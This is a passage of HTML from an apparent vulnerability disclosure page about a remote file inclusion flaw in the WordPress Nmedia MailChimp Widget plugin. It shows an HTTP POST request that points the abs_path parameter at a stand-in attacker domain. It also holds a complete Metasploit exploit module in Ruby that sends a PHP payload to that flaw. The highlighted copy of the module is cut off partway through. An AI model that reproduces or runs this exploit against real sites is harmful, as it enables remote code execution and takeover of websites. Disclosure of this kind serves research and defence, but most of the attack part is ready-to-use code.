class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line" id="crayon-53c9877b9b972329381329-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">21</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b972329381329-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9877b9b972329381329-7"><span class="crayon-v">abs_path</span><span class="crayon-o">=</span><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//myevildomain.com/</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0030 seconds] -->
<p><strong>Proof of concept code</strong></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877b9b97c893894775" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HttpServer::PHPInclude

    def initialize(info = {})
        super(update_info(info,
            'Name'           =&gt; 'WordPress Nmedia MailChimp Widget "abs_path" Remote File Inclusion Vulnerability',
            'Description'    =&gt; %q{
                    This module exploits a remote file include execution vulnerability in the
                WordPress Nmedia MailChimp Widget '/api_mailchimp/postToMailChimp.php' script. 
                All versions of Nmedia MailChimp Widget up to and including 3.1 are vulnerable.
            },
            'Author'         =&gt; [ 'Charlie Eriksen' ],
            'License'        =&gt; MSF_LICENSE,
            'Version'        =&gt; '$Revision$',
            'References'     =&gt;
                [
                    [ 'URL', 'http://secunia.com/advisories/49538/' ],
                ],
            'Privileged'     =&gt; false,
            'Payload'        =&gt;
                {
                    'DisableNops' =&gt; true,
                    'Compat'      =&gt;
                        {
                            'ConnectionType' =&gt; 'find',
                        },
                    # Arbitrary big number. The payload gets sent as an HTTP
                    # response body, so really it's unlimited
                    'Space'       =&gt; 262144, # 256k
                },
            'Platform'       =&gt; 'php',
            'Arch'           =&gt; ARCH_PHP,
            'Targets'        =&gt; [[ 'Automatic', { }]],
            'DisclosureDate' =&gt; 'Jun 21 2012',
            'DefaultTarget' =&gt; 0))

        register_options(
            [
                OptString.new('PHPURI', [ true , "The URI to request", '/wp-content/plugins/nmedia-mailchimp-widget/api_mailchimp/postToMailChimp.php']),
            ], self.class)
    end

    def php_exploit
        postdata = 'abs_path=' &lt;&lt; php_include_url

        print_status("Sending exploit request...")
        response = send_request_raw({
            'global'  =&gt; true,
            'method'  =&gt; 'POST',
            'uri'     =&gt; datastore['PHPURI'],
            'data'    =&gt; postdata,
            'headers' =&gt;
            {
                'Content-Type' =&gt; 'application/x-www-form-urlencoded',
                'Content-Length' =&gt; postdata.length,
            }
        })

        if response and response.code != 200
            print_error("Got a non-200 response back. The server may not be vulnerable (#{response.code})")
        end

        handler
    end

end</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-2">2</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-4">4</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-6">6</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-8">8</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-10">10</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-12">12</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-14">14</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-16">16</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-18">18</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-20">20</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-22">22</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-24">24</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-26">26</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-28">28</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-30">30</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-32">32</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-34">34</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-36">36</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-38">38</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-40">40</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-42">42</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-44">44</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-46">46</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-48">48</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-50">50</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-52">52</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-54">54</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-56">56</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-58">58</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-60">60</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-62">62</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-64">64</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-66">66</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-68">68</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-70">70</div><div class="crayon-num" data-line="crayon-53c9877b9b97c893894775-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9b97c893894775-72">72</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877b9b97c893894775-1"><span class="crayon-i">require</span><span class="crayon-h"> </span><span class="crayon-s">'msf/core'</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-3"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-i">Metasploit3</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-h"> </span><span class="crayon-i">Msf</span><span class="crayon-o">::</span><span class="crayon-i">Exploit</span><span class="crayon-o">::</span><span class="crayon-e">Remote</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-4"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">Rank</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">ExcellentRanking</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-6"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include </span><span class="crayon-i">Msf</span><span class="crayon-o">::</span><span class="crayon-i">Exploit</span><span class="crayon-o">::</span><span class="crayon-i">Remote</span><span class="crayon-o">::</span><span class="crayon-e">Tcp</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-7"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include </span><span class="crayon-i">Msf</span><span class="crayon-o">::</span><span class="crayon-i">Exploit</span><span class="crayon-o">::</span><span class="crayon-i">Remote</span><span class="crayon-o">::</span><span class="crayon-e">HttpClient</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-8"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include </span><span class="crayon-i">Msf</span><span class="crayon-o">::</span><span class="crayon-i">Exploit</span><span class="crayon-o">::</span><span class="crayon-i">Remote</span><span class="crayon-o">::</span><span class="crayon-i">HttpServer</span><span class="crayon-o">::</span><span class="crayon-e">PHPInclude</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-9">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-10"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">def </span><span class="crayon-e">initialize</span><span class="crayon-sy">(</span><span class="crayon-v">info</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">super</span><span class="crayon-sy">(</span><span class="crayon-e">update_info</span><span class="crayon-sy">(</span><span class="crayon-i">info</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Name'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'WordPress Nmedia MailChimp Widget "abs_path" Remote File Inclusion Vulnerability'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Description'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-e">q</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">This</span><span class="crayon-h"> </span><span class="crayon-e">module </span><span class="crayon-i">exploits</span><span class="crayon-h"> </span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-e">remote </span><span class="crayon-e">file </span><span class="crayon-e">include </span><span class="crayon-e">execution </span><span class="crayon-e">vulnerability </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">the</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-15"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">WordPress </span><span class="crayon-e">Nmedia </span><span class="crayon-e">MailChimp </span><span class="crayon-i">Widget</span><span class="crayon-h"> </span><span class="crayon-s">'/api_mailchimp/postToMailChimp.php'</span><span class="crayon-h"> </span><span class="crayon-v">script</span><span class="crayon-sy">.</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">All </span><span class="crayon-e">versions </span><span class="crayon-e">of </span><span class="crayon-e">Nmedia </span><span class="crayon-e">MailChimp </span><span class="crayon-e">Widget </span><span class="crayon-e">up </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-i">including</span><span class="crayon-h"> </span><span class="crayon-cn">3.1</span><span class="crayon-h"> </span><span class="crayon-e">are </span><span class="crayon-v">vulnerable</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Author'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-s">'Charlie Eriksen'</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'License'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">MSF_LICENSE</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Version'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'$Revision$'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'References'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-s">'URL'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'http://secunia.com/advisories/49538/'</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Privileged'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Payload'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'DisableNops'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Compat'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'ConnectionType'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'find'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-p"># Arbitrary big number. The payload gets sent as an HTTP</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-p"># response body, so really it's unlimited</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Space'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">262144</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-p"># 256k</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Platform'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'php'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Arch'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">ARCH_PHP</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Targets'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-s">'Automatic'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'DisclosureDate'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'Jun 21 2012'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'DefaultTarget'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-42">&nbsp;</div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">register_options</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-45"><span 